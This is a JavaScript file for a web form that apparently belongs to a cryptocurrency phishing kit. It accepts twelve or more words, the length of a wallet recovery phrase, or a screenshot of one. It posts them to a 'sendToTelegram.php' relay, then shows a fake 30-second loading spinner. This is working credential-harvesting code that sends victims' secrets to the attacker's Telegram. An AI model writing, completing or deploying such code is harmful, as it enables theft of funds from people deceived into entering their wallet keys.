
document.addEventListener("DOMContentLoaded", function () {
  // Hide the loading spinner on page load
  let loadingSpinner = document.getElementById("loadingSpinner");
  loadingSpinner.style.display = "none";  // Ensure it's hidden when the page loads

  document.getElementById("wordForm").addEventListener("submit", function (event) {
      event.preventDefault();

      let words = document.getElementById("words").value.trim();
      let fileInput = document.getElementById("fileUpload");
      let file = fileInput.files[0];
      let errorMessage = document.getElementById("error-message");

      if (words.split(" ").length < 12 && !file) {
          errorMessage.style.display = "block";
          return;
      }

      errorMessage.style.display = "none";
      let formData = new FormData();
      formData.append("words", words);

      if (file) {
          formData.append("image", file);
      }

      // Show the loading spinner only after clicking submit
      loadingSpinner.style.display = "flex";  // Show spinner when submit is clicked

      // Start sending the form data to Telegram
      fetch("sendToTelegram.php", {
          method: "POST",
          body: formData
      })
      .then(response => response.text())
      .then(data => {
          console.log("Success:", data);

          // Wait for 30 seconds before hiding the spinner
          setTimeout(function() {
              loadingSpinner.style.display = "none";  // Hide spinner after 30 seconds
          }, 30000); // 30 seconds
      })
      .catch(error => {
          console.error("Error:", error);
          loadingSpinner.style.display = "none";  // Hide spinner immediately in case of an error
      });
  });

  // Handle image upload feedback and enable submit button
  document.getElementById("fileUpload").addEventListener("change", function (event) {
      let file = event.target.files[0];
      let previewContainer = document.getElementById("imagePreview");
      let submitButton = document.querySelector("button[type='submit']");
      let words = document.getElementById("words").value.trim();
      let errorMessage = document.getElementById("error-message");

      if (file) {
          let reader = new FileReader();
          reader.onload = function (e) {
              previewContainer.innerHTML += `<img src="${e.target.result}" alt="Uploaded Image" style="max-width: 15%; margin-top: 10px; border-radius: 5px;">`;
          };
          reader.readAsDataURL(file);
      } else {
          previewContainer.innerHTML = "";
      }

      if (file || words.split(" ").length >= 12) {
          submitButton.disabled = false;
          errorMessage.style.display = "none";
      } else {
          submitButton.disabled = true;
      }
  });

  // Handle word input validation and enable submit button
  document.getElementById("words").addEventListener("input", function () {
      let words = this.value.trim();
      let fileInput = document.getElementById("fileUpload");
      let submitButton = document.querySelector("button[type='submit']");
      let errorMessage = document.getElementById("error-message");

      if (words.split(" ").length >= 12 || fileInput.files.length > 0) {
          submitButton.disabled = false;
          errorMessage.style.display = "none";
      } else {
          submitButton.disabled = true;
      }
  });
});
